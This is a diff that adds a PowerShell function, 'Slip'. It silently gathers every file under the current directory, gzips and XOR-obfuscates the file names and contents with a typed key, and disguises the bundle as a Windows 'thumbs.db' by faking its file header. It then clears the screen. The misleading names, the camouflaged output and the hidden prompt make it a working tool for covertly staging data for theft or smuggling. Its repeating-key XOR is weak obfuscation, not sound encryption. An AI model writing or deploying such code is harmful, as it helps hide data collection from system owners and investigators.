@@ -1,0 +1,40 @@
+function Slip {
+    $sk = Read-Host -AsSecureString -Prompt "."
+    $bs = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sk)
+    $xks = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bs)
+    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bs)
+    $xk = [System.Text.Encoding]::UTF8.GetBytes($xks)
+    function Add-Formula {
+        param($d, $k)
+        $o = [byte[]]::new($d.Length)
+        for ($i = 0; $i -lt $d.Length; $i++) {
+            $o[$i] = $d[$i] -bxor $k[$i % $k.Length]
+        }
+        return $o
+    }
+    $fs = gci -Recurse -File
+    $fme = [System.Collections.Generic.Dictionary[string, string]]::new()
+    foreach ($f in $fs) {
+        $r = $f.FullName.Substring($pwd.path.Length).TrimStart('\')
+        $nb = [System.Text.Encoding]::UTF8.GetBytes($r)
+        $xnb = Add-Formula $nb $xk
+        $en = [Convert]::ToBase64String($xnb)
+        $rb = [System.IO.File]::ReadAllBytes($f.FullName)
+        $cs = New-Object System.IO.MemoryStream
+        $gzs = New-Object System.IO.Compression.GzipStream($cs, [IO.Compression.CompressionMode]::Compress)
+        $gzs.Write($rb, 0, $rb.Length)
+        $gzs.Close()
+        $cb = $cs.ToArray()
+        $cs.Dispose()
+        $xc = Add-Formula $cb $xk
+        $fme[$en] = [Convert]::ToBase64String($xc)
+    }
+    $j = [System.Text.Json.JsonSerializer]::Serialize($fme, [System.Collections.Generic.Dictionary[string, string]], [System.Text.Json.JsonSerializerOptions]::new())
+    $jb = [System.Text.Encoding]::UTF8.GetBytes($j)
+    $xjb = Add-Formula $jb $xk
+    $oh = [byte[]](0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1)
+    $fp = $oh + $xjb
+    $d = $($pwd.path) + "\thumbs.db"
+    [System.IO.File]::WriteAllBytes($d, $fp)
+    cls 
+}
